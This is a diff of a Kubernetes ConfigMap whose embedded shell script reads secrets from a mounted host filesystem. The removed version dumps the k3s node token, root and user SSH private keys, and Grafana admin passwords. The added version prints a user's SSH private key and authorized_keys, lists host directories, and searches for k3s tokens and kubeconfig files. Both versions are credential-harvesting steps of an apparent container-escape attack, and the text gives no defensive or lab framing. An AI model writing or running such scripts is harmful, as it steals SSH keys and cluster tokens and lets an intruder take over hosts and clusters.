@@ -6,22 +6,14 @@ metadata:
 data:
   run.sh: |
     #!/bin/sh
-    echo '=== NODE TOKEN ==='
-    cat /k3s-server/node-token
-    
-    echo '=== SSH KEYS ROOT ==='
-    ls /host-root/root/.ssh/ 2>/dev/null && cat /host-root/root/.ssh/id_rsa 2>/dev/null || echo NOT_FOUND
-    cat /host-root/root/.ssh/authorized_keys 2>/dev/null || echo NO_AUTH_KEYS
-    
-    echo '=== SSH KEYS HOME ==='
-    for d in /host-root/home/*/; do
-      echo "User: $d"
-      cat "${d}.ssh/authorized_keys" 2>/dev/null
-      cat "${d}.ssh/id_rsa" 2>/dev/null
-    done
-    
-    echo '=== GRAFANA ENV ==='
-    cat /host-root/etc/grafana/grafana.ini 2>/dev/null | grep -E "admin_|password" | head -10
-    find /host-root/var/lib -name "grafana.db" 2>/dev/null | head -3
-    
+    echo '=== LS K3S SERVER ==='
+    ls -la /k3s-server/ 2>&1
+    echo '=== LS HOST ROOT ==='
+    ls /host-root/ 2>&1
+    echo '=== HOME PC SSH ==='
+    ls /host-root/home/pc/.ssh/ 2>&1
+    cat /host-root/home/pc/.ssh/authorized_keys 2>/dev/null
+    cat /host-root/home/pc/.ssh/id_rsa 2>/dev/null || echo NO_KEY
+    echo '=== FIND K3S TOKEN ==='
+    find /host-root/ -name "node-token" -o -name "k3s.yaml" 2>/dev/null | head -10
     echo '=== DONE ==='
